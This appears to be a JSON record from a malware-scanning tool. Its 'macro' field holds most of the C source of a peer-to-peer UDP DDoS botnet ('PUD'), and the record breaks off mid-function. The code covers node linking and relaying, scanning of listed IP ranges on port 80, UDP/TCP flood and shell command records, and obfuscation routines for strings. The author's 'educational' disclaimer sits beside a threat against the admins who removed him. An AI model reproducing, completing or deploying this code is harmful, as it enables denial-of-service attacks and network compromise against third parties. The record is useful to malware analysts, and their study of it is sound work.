{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Binary": "May read or write a binary file",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "command": "May run PowerShell commands",
            "exec": "May run an executable file or a system command using Excel 4 Macros",
            "open": "May open a file",
            "popen": "May run an executable file or a system command on a Mac",
            "register": "May call a DLL using Excel 4 Macros",
            "run": "May run an executable file or a system command",
            "virtual": "May detect virtualization",
            "write": "May write to a file"
        },
        "macro": "/****************************************************************************\n *                                                                          *\n *           Peer-to-peer UDP Distributed Denial of Service (PUD)           *\n *                         by contem@efnet                                  *\n *                                                                          *\n *         Virtually connects computers via the udp protocol on the         *\n *  specified port.  Uses a newly created peer-to-peer protocol that        *\n *  incorperates uses on unstable or dead computers.  The program is        *\n *  ran with the parameters of another ip on the virtual network.  If       *\n *  running on the first computer, run with the ip 127.0.0.1 or some        *\n *  other type of local address.  Ex:                                       *\n *                                                                          *\n *           Computer A:   ./program 127.0.0.1                              *\n *           Computer B:   ./program Computer_A                             *\n *           Computer C:   ./program Computer_A                             *\n *           Computer D:   ./program Computer_C                             *\n *                                                                          *\n *         Any form of that will work.  The linking process works by        *\n *  giving each computer the list of avaliable computers, then              *\n *  using a technique called broadcast segmentation combined with TCP       *\n *  like functionality to insure that another computer on the network       *\n *  receives the broadcast packet, segments it again and recreates          *\n *  the packet to send to other hosts.  That technique can be used to       *\n *  support over 16 million simutaniously connected computers.              *\n *                                                                          *\n *         Thanks to ensane and st for donating shells and test beds        *\n *  for this program.  And for the admins who removed me because I          *\n *  was testing this program (you know who you are) need to watch           *\n *  their backs.                                                            *\n *                                                                          *\n *         I am not responsible for any harm caused by this program!        *\n *  I made this program to demonstrate peer-to-peer communication and       *\n *  should not be used in real life.  It is an education program that       *\n *  should never even be ran at all, nor used in any way, shape or          *\n *  form.  It is not the authors fault if it was used for any purposes      *\n *  other than educational.                                                 *\n *                                                                          *\n ****************************************************************************/\n\n#include <stdio.h>\n#include <unistd.h>\n#include <string.h>\n#include <fcntl.h>\n#include <stdlib.h>\n#include <stdarg.h>\n#include <sys/ioctl.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/time.h>\n#include <unistd.h>\n#include <errno.h>\n#include <netdb.h>\n#include <arpa/telnet.h>\n#include <sys/wait.h>\n#include <signal.h>\n\n#define SCAN\n#undef LARGE_NET\n#undef FREEBSD\n\n#define BROADCASTS\t2\n#define LINKS\t\t128\n#define CLIENTS\t\t128\n#define PORT\t\t2002\n#define SCANPORT\t80\n#define SCANTIMEOUT\t5\n#define MAXPATH\t\t4096\n#define ESCANPORT\t10100\n#define VERSION\t\t12092002\n\n//////////////////////////////////////////////////////////////////////////////////////\n//                                  Macros                                          //\n//////////////////////////////////////////////////////////////////////////////////////\n\n#define FREE(x) {if (x) { free(x);x=NULL; }}\n\nenum { TCP_PENDING=1, TCP_CONNECTED=2, SOCKS_REPLY=3 };\nenum { ASUCCESS=0, ARESOLVE, ACONNECT, ASOCKET, ABIND, AINUSE, APENDING, AINSTANCE, AUNKNOWN };\nenum { AREAD=1, AWRITE=2, AEXCEPT=4 };\n\n//////////////////////////////////////////////////////////////////////////////////////\n//                                  Packet headers                                  //\n//////////////////////////////////////////////////////////////////////////////////////\n\nstruct llheader {\n\tchar type;\n\tunsigned long checksum;\n\tunsigned long id;\n};\nstruct header {\n\tchar tag;\n\tint id;\n\tunsigned long len;\n\tunsigned long seq;\n};\nstruct route_rec {\n\tstruct header h;\n\tchar sync;\n\tunsigned char hops;\n\tunsigned long server;\n\tunsigned long links;\n};\nstruct kill_rec {\n\tstruct header h;\n};\nstruct sh_rec {\n\tstruct header h;\n};\nstruct list_rec {\n\tstruct header h;\n};\nstruct udp_rec {\n\tstruct header h;\n\tunsigned long size;\n\tunsigned long target;\n\tunsigned short port;\n\tunsigned long secs;\n};\nstruct tcp_rec {\n\tstruct header h;\n\tunsigned long target;\n\tunsigned short port;\n\tunsigned long secs;\n};\nstruct tcp6_rec {\n\tstruct header h;\n\tunsigned long target[4];\n\tunsigned short port;\n\tunsigned long secs;\n};\nstruct gen_rec {\n\tstruct header h;\n\tunsigned long target;\n\tunsigned short port;\n\tunsigned long secs;\n};\nstruct df_rec {\n\tstruct header h;\n\tunsigned long target;\n\tunsigned long secs;\n};\nstruct add_rec {\n\tstruct header h;\n\tunsigned long server;\n\tunsigned long socks;\n\tunsigned long bind;\n\tunsigned short port;\n};\nstruct data_rec {\n\tstruct header h;\n};\nstruct addsrv_rec {\n\tstruct header h;\n};\nstruct initsrv_rec {\n\tstruct header h;\n};\nstruct qmyip_rec {\n\tstruct header h;\n};\nstruct myip_rec {\n\tstruct header h;\n\tunsigned long ip;\n};\nstruct escan_rec {\n\tstruct header h;\n\tunsigned long ip;\n};\nstruct getinfo_rec {\n\tstruct header h;\n\tunsigned long time;\n\tunsigned long mtime;\n};\nstruct info_rec {\n\tstruct header h;\n\tunsigned char a;\n\tunsigned char b;\n\tunsigned char c;\n\tunsigned char d;\n\tunsigned long ip;\n\tunsigned long uptime;\n\tunsigned long reqtime;\n\tunsigned long reqmtime;\n\tunsigned long in;\n\tunsigned long out;\n\tunsigned long version;\n};\n\n//////////////////////////////////////////////////////////////////////////////////////\n//                             Public variables                                     //\n//////////////////////////////////////////////////////////////////////////////////////\n\nstruct ainst {\n\tvoid *ext,*ext5;\n\tint ext2,ext3,ext4;\n\n\tint sock,error;\n\tunsigned long len;\n\tstruct sockaddr_in in;\n};\nstruct ainst clients[CLIENTS*2];\nstruct ainst udpclient;\nunsigned int sseed=0;\nstruct route_table {\n\tint id;\n\tunsigned long ip;\n\tunsigned short port;\n} routes[LINKS];\nunsigned long numlinks, *links=NULL, myip=0;\nunsigned long sequence[LINKS], rsa[LINKS];\nunsigned int *pids=NULL;\nunsigned long numpids=0;\nunsigned long uptime=0, in=0, out=0;\nunsigned long synctime=0;\nint syncmodes=1;\n\nstruct mqueue {\n\tchar *packet;\n\tunsigned long len;\n\tunsigned long id;\n\tunsigned long time;\n\tunsigned long ltime;\n\tunsigned long destination;\n\tunsigned short port;\n\tunsigned char trys;\n\tstruct mqueue *next;\n} *queues=NULL;\n\n#ifdef SCAN\nunsigned char classes[] = { 3, 4, 6, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 28, 29, 30, 32, 33, 34, 35, 38, 40, 43, 44, 45,\n\t46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 61, 62, 63, 64, 65, 66, 67, 68, 80, 81, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138,\n\t139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167,\n\t168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196,\n\t198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 224, 225, 226, 227, 228, 229,\n\t230, 231, 232, 233, 234, 235, 236, 237, 238, 239 };\n#endif\n\n//////////////////////////////////////////////////////////////////////////////////////\n//                               Public routines                                    //\n//////////////////////////////////////////////////////////////////////////////////////\n\nunsigned long gettimeout() {\n\treturn 36+(numlinks/15);\n}\n\nvoid syncmode(int mode) {\n\tsyncmodes=mode;\n}\n\nvoid gsrand(unsigned long s) {\n\tsseed=s;\n}\nunsigned long grand() {\n\tsseed=((sseed*965764979)%65535)/2;\n\treturn sseed;\n}\n\nvoid nas(int a) {\n}\n\nint mfork() {\n\tunsigned int parent, *newpids, i;\n\tparent=fork();\n\tif (parent <= 0) return parent;\n\tnumpids++;\n\tnewpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));\n\tif (newpids == NULL) return parent;\n\tfor (i=0;i<numpids-1;i++) newpids[i]=pids[i];\n\tnewpids[numpids-1]=parent;\n\tFREE(pids);\n\tpids=newpids;\n\treturn parent;\n}\n\nchar *aerror(struct ainst *inst) {\n\tif (inst == NULL) return \"Invalid instance or socket\";\n\tswitch(inst->error) {\n\t\tcase ASUCCESS:return \"Operation Success\";\n\t\tcase ARESOLVE:return \"Unable to resolve\";\n\t\tcase ACONNECT:return \"Unable to connect\";\n\t\tcase ASOCKET:return \"Unable to create socket\";\n\t\tcase ABIND:return \"Unable to bind socket\";\n\t\tcase AINUSE:return \"Port is in use\";\n\t\tcase APENDING:return \"Operation pending\";\n\t\tcase AUNKNOWN:default:return \"Unknown\";\n\t}\n\treturn \"\";\n}\n\nint aresolve(char *host) {\n \tstruct hostent *hp;\n\tif (inet_addr(host) == 0 || inet_addr(host) == -1) {\n\t\tunsigned long a;\n\t\tif ((hp = gethostbyname(host)) == NULL) return 0;\n\t\tbcopy((char*)hp->h_addr, (char*)&a, hp->h_length);\n\t\treturn a;\n\t}\n\telse return inet_addr(host);\n}\n\nint abind(struct ainst *inst,unsigned long ip,unsigned short port) {\n\tstruct sockaddr_in in;\n\tif (inst == NULL) return (AINSTANCE);\n\tif (inst->sock == 0) {\n\t\tinst->error=AINSTANCE;\n\t\treturn (AINSTANCE);\n\t}\n\tinst->len=0;\n\tin.sin_family = AF_INET;\n\tif (ip == NULL) in.sin_addr.s_addr = INADDR_ANY;\n\telse in.sin_addr.s_addr = ip;\n\tin.sin_port = htons(port);\n\tif (bind(inst->sock, (struct sockaddr *)&in, sizeof(in)) < 0) {\n\t\tinst->error=ABIND;\n\t\treturn (ABIND);\n\t}\n\tinst->error=ASUCCESS;\n\treturn ASUCCESS;\n}\n\nint await(struct ainst **inst,unsigned long len,char type,long secs) {\n\tstruct timeval tm,*tmp;\n\tfd_set read,write,except,*readp,*writep,*exceptp;\n\tint p,ret,max;\n\tif (inst == NULL) return (AINSTANCE);\n\tfor (p=0;p<len;p++) inst[p]->len=0;\n\tif (secs > 0) {\n\t\ttm.tv_sec=secs;\n\t\ttm.tv_usec=0;\n\t\ttmp=&tm;\n\t}\n\telse tmp=(struct timeval *)NULL;\n\tif (type & AREAD) {\n\t\tFD_ZERO(&read);\n\t\tfor (p=0;p<len;p++) FD_SET(inst[p]->sock,&read);\n\t\treadp=&read;\n\t}\n\telse readp=(struct fd_set*)0;\n\tif (type & AWRITE) {\n\t\tFD_ZERO(&write);\n\t\tfor (p=0;p<len;p++) FD_SET(inst[p]->sock,&write);\n\t\twritep=&write;\n\t}\n\telse writep=(struct fd_set*)0;\n\tif (type & AEXCEPT) {\n\t\tFD_ZERO(&except);\n\t\tfor (p=0;p<len;p++) FD_SET(inst[p]->sock,&except);\n\t\texceptp=&except;\n\t}\n\telse exceptp=(struct fd_set*)0;\n\tfor (p=0,max=0;p<len;p++) if (inst[p]->sock > max) max=inst[p]->sock;\n\tif ((ret=select(max+1,readp,writep,exceptp,tmp)) == 0) {\n\t\tfor (p=0;p<len;p++) inst[p]->error=APENDING;\n\t\treturn (APENDING);\n\t}\n\tif (ret == -1) return (AUNKNOWN);\n\tfor (p=0;p<len;p++) {\n\t\tif (type & AREAD) if (FD_ISSET(inst[p]->sock,&read)) inst[p]->len+=AREAD;\n\t\tif (type & AWRITE) if (FD_ISSET(inst[p]->sock,&write)) inst[p]->len+=AWRITE;\n\t\tif (type & AEXCEPT) if (FD_ISSET(inst[p]->sock,&except)) inst[p]->len+=AEXCEPT;\n\t}\n\tfor (p=0;p<len;p++) inst[p]->error=ASUCCESS;\n\treturn (ASUCCESS);\n}\n\nint atcp_sync_check(struct ainst *inst) {\n\tif (inst == NULL) return (AINSTANCE);\n\tinst->len=0;\n\terrno=0;\n\tif (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {\n\t\tinst->error=ASUCCESS;\n\t\treturn (ASUCCESS);\n\t}\n\tif (!(errno == EINPROGRESS ||errno == EALREADY)) {\n\t\tinst->error=ACONNECT;\n\t\treturn (ACONNECT);\n\t}\n\tinst->error=APENDING;\n\treturn (APENDING);\n}\n\nint atcp_sync_connect(struct ainst *inst,char *host,unsigned int port) {\n\tint flag=1;\n \tstruct hostent *hp;\n\tif (inst == NULL) return (AINSTANCE);\n\tinst->len=0;\n\tif ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {\n\t\tinst->error=ASOCKET;\n\t\treturn (ASOCKET);\n\t}\n\tif (inet_addr(host) == 0 || inet_addr(host) == -1) {\n\t\tif ((hp = gethostbyname(host)) == NULL) {\n\t\t\tinst->error=ARESOLVE;\n\t\t\treturn (ARESOLVE);\n\t\t}\n\t\tbcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);\n\t}\n\telse inst->in.sin_addr.s_addr=inet_addr(host);\n\tinst->in.sin_family = AF_INET;\n\tinst->in.sin_port = htons(port);\n\tflag = fcntl(inst->sock, F_GETFL, 0);\n\tflag |= O_NONBLOCK;\n\tfcntl(inst->sock, F_SETFL, flag);\n\tinst->error=ASUCCESS;\n\treturn (ASUCCESS);\n}\n\nint atcp_connect(struct ainst *inst,char *host,unsigned int port) {\n\tint flag=1;\n\tunsigned long start;\n \tstruct hostent *hp;\n\tif (inst == NULL) return (AINSTANCE);\n\tinst->len=0;\n\tif ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {\n\t\tinst->error=ASOCKET;\n\t\treturn (ASOCKET);\n\t}\n\tif (inet_addr(host) == 0 || inet_addr(host) == -1) {\n\t\tif ((hp = gethostbyname(host)) == NULL) {\n\t\t\tinst->error=ARESOLVE;\n\t\t\treturn (ARESOLVE);\n\t\t}\n\t\tbcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);\n\t}\n\telse inst->in.sin_addr.s_addr=inet_addr(host);\n\tinst->in.sin_family = AF_INET;\n\tinst->in.sin_port = htons(port);\n\tflag = fcntl(inst->sock, F_GETFL, 0);\n\tflag |= O_NONBLOCK;\n\tfcntl(inst->sock, F_SETFL, flag);\n\tstart=time(NULL);\n\twhile(time(NULL)-start < 10) {\n\t\terrno=0;\n\t\tif (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {\n\t\t\tinst->error=ASUCCESS;\n\t\t\treturn (ASUCCESS);\n\t\t}\n\t\tif (!(errno == EINPROGRESS ||errno == EALREADY)) break;\n\t\tsleep(1);\n\t}\n\tinst->error=ACONNECT;\n\treturn (ACONNECT);\n}\n\nint atcp_accept(struct ainst *inst,struct ainst *child) {\n\tint sock;\n\tunsigned int datalen;\n\tif (inst == NULL || child == NULL) return (AINSTANCE);\n\tdatalen=sizeof(child->in);\n\tinst->len=0;\n\tmemcpy((void*)child,(void*)inst,sizeof(struct ainst));\n\tif ((sock=accept(inst->sock,(struct sockaddr *)&child->in,&datalen)) < 0) {\n\t\tmemset((void*)child,0,sizeof(struct ainst));\n\t\tinst->error=APENDING;\n\t\treturn (APENDING);\n\t}\n\tchild->sock=sock;\n\tinst->len=datalen;\n\tinst->error=ASUCCESS;\n\treturn (ASUCCESS);\n}\n\nint atcp_send(struct ainst *inst,char *buf,unsigned long len) {\n\tlong datalen;\n\tif (inst == NULL) return (AINSTANCE);\n\tinst->len=0;\n\terrno=0;\n\tif ((datalen=write(inst->sock,buf,len)) < len) {\n\t\tif (errno == EAGAIN) {\n\t\t\tinst->error=APENDING;\n\t\t\treturn (APENDING);\n\t\t}\n\t\telse {\n\t\t\tinst->error=AUNKNOWN;\n\t\t\treturn (AUNKNOWN);\n\t\t}\n\t}\n\tinst->len=datalen;\n\tinst->error=ASUCCESS;\n\treturn (ASUCCESS);\n}\n\nint atcp_sendmsg(struct ainst *inst, char *words, ...) {\n\tstatic char textBuffer[2048];\n\tunsigned int a;\n\tva_list args;\n\tva_start(args, words);\n\ta=vsprintf(textBuffer, words, args);\n\tva_end(args);\n\treturn atcp_send(inst,textBuffer,a);\n}\n\nint atcp_recv(struct ainst *inst,char *buf,unsigned long len) {\n\tlong datalen;\n\tif (inst == NULL) return (AINSTANCE);\n\tinst->len=0;\n\tif ((datalen=read(inst->sock,buf,len)) < 0) {\n\t\tif (errno == EAGAIN) {\n\t\t\tinst->error=APENDING;\n\t\t\treturn (APENDING);\n\t\t}\n\t\telse {\n\t\t\tinst->error=AUNKNOWN;\n\t\t\treturn (AUNKNOWN);\n\t\t}\n\t}\n\tif (datalen == 0 && len) {\n\t\tinst->error=AUNKNOWN;\n\t\treturn (AUNKNOWN);\n\t}\n\tinst->len=datalen;\n\tinst->error=ASUCCESS;\n\treturn (ASUCCESS);\n}\n\nint atcp_close(struct ainst *inst) {\n\tif (inst == NULL) return (AINSTANCE);\n\tinst->len=0;\n\tif (close(inst->sock) < 0) {\n\t\tinst->error=AUNKNOWN;\n\t\treturn (AUNKNOWN);\n\t}\n\tinst->sock=0;\n\tinst->error=ASUCCESS;\n\treturn (ASUCCESS);\n}\n\nint audp_listen(struct ainst *inst,unsigned int port) {\n\tint flag=1;\n\tif (inst == NULL) return (AINSTANCE);\n\tinst->len=0;\n\tif ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {\n\t\tinst->error=ASOCKET;\n\t\treturn (ASOCKET);\n\t}\n\tinst->in.sin_family = AF_INET;\n\tinst->in.sin_addr.s_addr = INADDR_ANY;\n\tinst->in.sin_port = htons(port);\n\tif (bind(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) < 0) {\n\t\tinst->error=ABIND;\n\t\treturn (ABIND);\n\t}\n#ifdef O_DIRECT\n\tflag = fcntl(inst->sock, F_GETFL, 0);\n\tflag |= O_DIRECT;\n\tfcntl(inst->sock, F_SETFL, flag);\n#endif\n\tinst->error=ASUCCESS;\n\tflag=1;\n\tsetsockopt(inst->sock,SOL_SOCKET,SO_OOBINLINE,&flag,sizeof(flag));\n\treturn (ASUCCESS);\n}\n\nint audp_setup(struct ainst *inst,char *host,unsigned int port) {\n\tint flag=1;\n \tstruct hostent *hp;\n\tif (inst == NULL) return (AINSTANCE);\n\tinst->len=0;\n\tif ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {\n\t\tinst->error=ASOCKET;\n\t\treturn (ASOCKET);\n\t}\n\tif (inet_addr(host) == 0 || inet_addr(host) == -1) {\n\t\tif ((hp = gethostbyname(host)) == NULL) {\n\t\t\tinst->error=ARESOLVE;\n\t\t\treturn (ARESOLVE);\n\t\t}\n\t\tbcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);\n\t}\n\telse inst->in.sin_addr.s_addr=inet_addr(host);\n\tinst->in.sin_family = AF_INET;\n\tinst->in.sin_port = htons(port);\n#ifdef O_DIRECT\n\tflag = fcntl(inst->sock, F_GETFL, 0);\n\tflag |= O_DIRECT;\n\tfcntl(inst->sock, F_SETFL, flag);\n#endif\n\tinst->error=ASUCCESS;\n\treturn (ASUCCESS);\n}\n\nint audp_relay(struct ainst *parent,struct ainst *inst,char *host,unsigned int port) {\n \tstruct hostent *hp;\n\tif (inst == NULL) return (AINSTANCE);\n\tinst->len=0;\n\tinst->sock = parent->sock;\n\tif (inet_addr(host) == 0 || inet_addr(host) == -1) {\n\t\tif ((hp = gethostbyname(host)) == NULL) {\n\t\t\tinst->error=ARESOLVE;\n\t\t\treturn (ARESOLVE);\n\t\t}\n\t\tbcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);\n\t}\n\telse inst->in.sin_addr.s_addr=inet_addr(host);\n\tinst->in.sin_family = AF_INET;\n\tinst->in.sin_port = htons(port);\n\tinst->error=ASUCCESS;\n\treturn (ASUCCESS);\n}\n\nint audp_send(struct ainst *inst,char *buf,unsigned long len) {\n\tlong datalen;\n\tif (inst == NULL) return (AINSTANCE);\n\tinst->len=0;\n\terrno=0;\n\tif ((datalen=sendto(inst->sock,buf,len,0,(struct sockaddr*)&inst->in,sizeof(inst->in))) < len) {\n\t\tif (errno == EAGAIN) {\n\t\t\tinst->error=APENDING;\n\t\t\treturn (APENDING);\n\t\t}\n\t\telse {\n\t\t\tinst->error=AUNKNOWN;\n\t\t\treturn (AUNKNOWN);\n\t\t}\n\t}\n\tout++;\n\tinst->len=datalen;\n\tinst->error=ASUCCESS;\n\treturn (ASUCCESS);\n}\n\nint audp_sendmsg(struct ainst *inst, char *words, ...) {\n\tstatic char textBuffer[2048];\n\tunsigned int a;\n\tva_list args;\n\tva_start(args, words);\n\ta=vsprintf(textBuffer, words, args);\n\tva_end(args);\n\treturn audp_send(inst,textBuffer,a);\n}\n\nint audp_recv(struct ainst *inst,struct ainst *client,char *buf,unsigned long len) {\n\tlong datalen,nlen;\n\tif (inst == NULL) return (AINSTANCE);\n\tnlen=sizeof(inst->in);\n\tinst->len=0;\n\tmemcpy((void*)client,(void*)inst,sizeof(struct ainst));\n\tif ((datalen=recvfrom(inst->sock,buf,len,0,(struct sockaddr*)&client->in,(size_t*)&nlen)) < 0) {\n\t\tif (errno == EAGAIN) {\n\t\t\tinst->error=APENDING;\n\t\t\treturn (APENDING);\n\t\t}\n\t\telse {\n\t\t\tinst->error=AUNKNOWN;\n\t\t\treturn (AUNKNOWN);\n\t\t}\n\t}\n\tinst->len=datalen;\n\tinst->error=ASUCCESS;\n\treturn (ASUCCESS);\n}\n\nint audp_close(struct ainst *inst) {\n\tif (inst == NULL) return (AINSTANCE);\n\tinst->len=0;\n\tif (close(inst->sock) < 0) {\n\t\tinst->error=AUNKNOWN;\n\t\treturn (AUNKNOWN);\n\t}\n\tinst->sock=0;\n\tinst->error=ASUCCESS;\n\treturn (ASUCCESS);\n}\n\nunsigned long _decrypt(char *str, unsigned long len) {\n\tunsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};\n\tgsrand(((seed[0]+seed[1])*seed[2])^seed[3]);\n\twhile(1) {\n\t\tgsrand(seed[pos%4]+grand()+pos);\n\t\tstr[pos]-=grand();\n\t\tpos++;\n\t\tif (pos >= len) break;\n\t}\n\treturn pos;\n}\n\nunsigned long _encrypt(char *str, unsigned long len) {\n\tunsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};\n\tgsrand(((seed[0]+seed[1])*seed[2])^seed[3]);\n\twhile(1) {\n\t\tgsrand(seed[pos%4]+grand()+pos);\n\t\tstr[pos]+=grand();\n\t\tpos++;\n\t\tif (pos >= len) break;\n\t}\n\treturn pos;\n}\n\nint useseq(unsigned long seq) {\n\tunsigned long a;\n\tif (seq == 0) return 0;\n\tfor (a=0;a<LINKS;a++) if (sequence[a] == seq) return 1;\n\treturn 0;\n}\n\nunsigned long newseq() {\n\tunsigned long seq;\n\twhile(1) {\n\t\tseq=(rand()*rand())^rand();\n\t\tif (useseq(seq) || seq == 0) continue;\n\t\tbreak;\n\t}\n\treturn seq;\n}\n\nvoid addseq(unsigned long seq) {\n\tunsigned long i;\n\tfor (i=LINKS-1;i>0;i--) sequence[i]=sequence[i-1];\n\tsequence[0]=seq;\n}\n\nvoid addserver(unsigned long server) {\n\tunsigned long *newlinks, i, stop;\n\tchar a=0;\n\tfor (i=0;i<numlinks;i++) if (links[i] == server) a=1;\n\tif (a == 1 || server == 0) return;\n\tnumlinks++;\n\tnewlinks=(unsigned long*)malloc((numlinks+1)*sizeof(unsigned long));\n\tif (newlinks == NULL) return;\n\tstop=rand()%numlinks;\n\tfor (i=0;i<stop;i++) newlinks[i]=links[i];\n\tnewlinks[i]=server;\n\tfor (;i<numlinks-1;i++) newlinks[i+1]=links[i];\n\tFREE(links);\n\tlinks=newlinks;\n}\n\nvoid conv(char *str,int len,unsigned long server) {\n\tmemset(str,0,len);\n\tstrcpy(str,(char*)inet_ntoa(*(struct in_addr*)&server));\n}\n\nint isreal(unsigned long server) {\n\tchar srv[256];\n\tunsigned int i,f;\n\tunsigned char a=0,b=0;\n\tconv(srv,256,server);\n\tfor (i=0;i<strlen(srv) && srv[i]!='.';i++);\n\tsrv[i]=0;\n\ta=atoi(srv);\n\tf=i+1;\n\tfor (i++;i<strlen(srv) && srv[i]!='.';i++);\n\tsrv[i]=0;\n\tb=atoi(srv+f);\n\tif (a == 127 || a == 10 || a == 0) return 0;\n\tif (a == 172 && b >= 16 && b <= 31) return 0;\n\tif (a == 192 && b == 168) return 0;\n\treturn 1;\n}\n\nu_short in_cksum(u_short *addr, int len) {\n\tregister int nleft = len;\n\tregister u_short *w = addr;\n\tregister int sum = 0;\n\tu_short answer =0;\n\twhile (nleft > 1) {\n\t\tsum += *w++;\n\t\tnleft -= 2;\n\t}\n\tif (nleft == 1) {\n\t\t*(u_char *)(&answer) = *(u_char *)w;\n\t\tsum += answer;\n\t}\n\tsum = (sum >> 16) + (sum & 0xffff);\n\tsum += (sum >> 16);\n\tanswer = ~sum;\n\treturn(answer);\n}\n\nint usersa(unsigned long rs) {\n\tunsigned long a;\n\tif (rs == 0) return 0;\n\tfor (a=0;a<LINKS;a++) if (rsa[a] == rs) return 1;\n\treturn 0;\n}\n\nunsigned long newrsa() {\n\tunsigned long rs;\n\twhile(1) {\n\t\trs=(rand()*rand())^rand();\n\t\tif (usersa(rs) || rs == 0) continue;\n\t\tbreak;\n\t}\n\treturn rs;\n}\n\nvoid addrsa(unsigned long rs) {\n\tunsigned long i;\n\tfor (i=LINKS-1;i>0;i--) rsa[i]=rsa[i-1];\n\trsa[0]=rs;\n}\n\nvoid delqueue(unsigned long id) {\n\tstruct mqueue *getqueue=queues, *prevqueue=NULL;\n\twhile(getqueue != NULL) {\n\t\tif (getqueue->id == id) {\n\t\t\tgetqueue->trys--;\n\t\t\tif (!getqueue->trys) {\n\t\t\t\tif (prevqueue) prevqueue->next=getqueue->next;\n\t\t\t\telse queues=getqueue->next;\n\t\t\t}\n\t\t\treturn;\n\t\t}\n\t\tprevqueue=getqueue;\n\t\tgetqueue=getqueue->next;\n\t}\n}\n\nint waitforqueues() {\n\tif (mfork() == 0) {\n\t\tsleep(gettimeout());\n\t\treturn 0;\n\t}\n\treturn 1;\n}\n\n//////////////////////////////////////////////////////////////////////////////////////\n//                                   Sending functions                              //\n//////////////////////////////////////////////////////////////////////////////////////\n\nstruct ainst udpserver;\n\nchar *lowsend(struct ainst *ts,unsigned char b,char *buf,unsigned long len) {\n\tstruct llheader rp;\n\tstruct mqueue *q;\n\tchar *mbuf=(char*)malloc(sizeof(rp)+len);\n\tif (mbuf == NULL) return NULL;\n\tmemset((void*)&rp,0,sizeof(struct llheader));\n\trp.checksum=in_cksum(buf,len);\n\trp.id=newrsa();\n\trp.type=0;\n\tmemcpy(mbuf,&rp,sizeof(rp));\n\tmemcpy(mbuf+sizeof(rp),buf,len);\n\n\tq=(struct mqueue *)malloc(sizeof(struct mqueue));\n\tq->packet=(char*)malloc(sizeof(rp)+len);\n\tmemcpy(q->packet,mbuf,sizeof(rp)+len);\n\tq->len=sizeof(rp)+len;\n\tq->id=rp.id;\n\tq->time=time(NULL);\n\tq->ltime=time(NULL);\n\tif (b) {\n\t\tq->destination=0;\n\t\tq->port=PORT;\n\t\tq->trys=b;\n\t}\n\telse {\n\t\tq->destination=ts->in.sin_addr.s_addr;\n\t\tq->port=htons(ts->in.sin_port);\n\t\tq->trys=1;\n\t}\n\tq->next=queues;\n\tqueues=q;\n\n\tif (ts) {\n\t\taudp_send(ts,mbuf,len+sizeof(rp));\n\t\tFREE(mbuf);\n\t}\n\telse return mbuf;\n}\n\nint relayclient(struct ainst *ts,char *buf,unsigned long len) {\n\treturn lowsend(ts,0,buf,len)?1:0;\n}\n\nint relay(unsigned long server,char *buf,unsigned long len) {\n\tstruct ainst ts;\n\tchar srv[256];\n\tmemset((void*)&ts,0,sizeof(struct ainst));\n\tconv(srv,256,server);\n\taudp_relay(&udpserver,&ts,srv,PORT);\n\treturn lowsend(&ts,0,buf,len)?1:0;\n}\n\nvoid segment(unsigned char low,char *buf, unsigned long len) {\n\tunsigned long a=0,c=0;\n\tchar *mbuf=NULL;\n\tif (numlinks == 0 || links == NULL) return;\n\tif (low) mbuf=lowsend(NULL,low,buf,len);\n\tfor(;c < 10;c++) {\n\t\ta=rand()%numlinks;\n\t\tif (links[a] != myip) {\n\t\t\tstruct ainst ts;\n\t\t\tchar srv[256];\n\t\t\tmemset((void*)&ts,0,sizeof(struct ainst));\n\t\t\tconv(srv,256,links[a]);\n\t\t\taudp_relay(&udpserver,&ts,srv,PORT);\n\t\t\tif (mbuf) audp_send(&ts,mbuf,len+sizeof(struct llheader));\n\t\t\telse audp_send(&ts,buf,len);\n\t\t\tbreak;\n\t\t}\n\t}\n\tFREE(mbuf);\n}\n\nvoid broadcast(char *buf,unsigned long len) {\n\tstruct route_rec rc;\n\tchar *str=(char*)malloc(sizeof(struct route_rec)+len+1);\n\tif (str == NULL) return;\n\tmemset((void*)&rc,0,sizeof(struct route_rec));\n\trc.h.tag=0x26;\n\trc.h.id=rand();\n\trc.h.len=sizeof(struct route_rec)+len;\n\trc.h.seq=newseq();\n\trc.server=0;\n\trc.sync=syncmodes;\n\trc.links=numlinks;\n\trc.hops=5;\n\tmemcpy((void*)str,(void*)&rc,sizeof(struct route_rec));\n\tmemcpy((void*)(str+sizeof(struct route_rec)),(void*)buf,len);\n\tsegment(2,str,sizeof(struct route_rec)+len);\n\tFREE(str);\n}\n\nvoid syncm(struct ainst *inst,char tag,int id) {\n\tstruct addsrv_rec rc;\n\tstruct next_rec { unsigned long server; } fc;\n\tunsigned long a,b;\n\tfor (b=0;;b+=700) {\n\t\tunsigned long 